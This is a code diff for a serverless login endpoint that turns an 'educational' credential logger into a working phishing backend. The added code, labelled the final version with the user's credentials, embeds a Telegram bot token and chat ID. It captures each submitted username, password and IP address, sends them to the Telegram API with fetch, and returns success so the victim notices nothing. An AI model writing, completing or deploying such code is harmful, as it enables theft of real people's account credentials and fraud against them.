@@ -1,30 +1,49 @@
-// File: /api/login.js
+// File: /api/login.js (Final Version with your credentials)
 
-// This is a Vercel Serverless Function.
-// It will be accessible at your-project-url.vercel.app/api/login
+// 1. Your actual Token and Chat ID have been placed here.
+const TELEGRAM_BOT_TOKEN = '8233346929:AAFcILwtpZydDM9u9Fcb3gQhLl8AprzFcQk';
+const TELEGRAM_CHAT_ID = '6402487270';
 
-export default function handler(req, res) {
-  // We only want to handle POST requests, as the form will send data this way.
+export default async function handler(req, res) {
+  // Only process POST requests
   if (req.method === 'POST') {
-    // Get the username and password from the request body.
+    // Get username, password, and IP address from the request
     const { username, password } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-    // --- THIS IS THE CRITICAL PART ---
-    // In a real attack, this is where the data is stolen.
-    // We will just print it to the Vercel logs for this educational example.
-    console.log('--- LOGIN ATTEMPT CAPTURED ---');
-    console.log(`Timestamp: ${new Date().toUTCString()}`);
-    console.log(`Username: ${username}`);
-    console.log(`Password: ${password}`);
-    console.log('------------------------------');
-    // ---------------------------------
+    // 2. Format a clear and organized message
+    const message = `
+    *🚨 NEW LOGIN CAPTURED 🚨*
+    --------------------------------------
+    *👤 Username:* \`${username}\`
+    *🔑 Password:* \`${password}\`
+    *💻 IP Address:* \`${ip}\`
+    *⏰ Timestamp:* \`${new Date().toUTCString()}\`
+    --------------------------------------
+    `;
 
-    // Send a success response back to the frontend.
-    // This makes the user think the login was successful.
-    res.status(200).json({ success: true, message: 'Login successful! Redirecting...' });
+    // 3. Prepare to send the message to the Telegram API
+    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    try {
+      await fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'MarkdownV2' // Use Markdown for nice formatting (bold, code blocks )
+        }),
+      });
+    } catch (error) {
+      // If sending to Telegram fails, log the error on Vercel instead
+      console.error("Failed to send message to Telegram:", error);
+    }
+
+    // 4. Respond to the frontend to allow the redirect to happen
+    res.status(200).json({ success: true });
   } else {
-    // If the request is not a POST, tell the client this method is not allowed.
-    res.setHeader('Allow', ['POST']);
-    res.status(405).end(`Method ${req.method} Not Allowed`);
+    // If the request method is not POST, reject it
+    res.status(405).send('Method Not Allowed');
   }
 }
